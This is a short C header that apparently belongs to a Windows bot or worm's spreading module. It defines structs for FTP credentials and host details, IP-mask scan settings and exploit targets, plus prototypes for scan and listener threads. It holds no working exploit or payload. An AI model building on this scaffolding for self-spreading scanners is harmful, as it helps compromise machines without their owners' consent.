struct cftps
/* struct to hold ftp info */
{
	char user[32];
	char pass[32];
	char host[128];
	char file[64];
	char port[8];
};

struct scans
/* struct for various scan functions */
{
	int tnum;
	int delay;
	unsigned short port;
	unsigned short port2;
	unsigned short port3;
	char exploit[64];
	char mask[16];
	bool usecftp;
	bool gotinfo;
	bool lgotinfo;
	struct cftps cftp;
	SOCKET sock;
};

struct exploits
/* struct for use with exploits */
{
	unsigned short port;
	unsigned long ip;
	bool usecftp;
	bool gotinfo;
	struct cftps cftp;
};

unsigned long scan_getnextip(const char *scanmask);

bool scan_checkservers(struct scans scan);

void scan_portopen(unsigned long ip, unsigned short port);

DWORD WINAPI scan_start(void *param);

DWORD WINAPI scan_listen(void *param);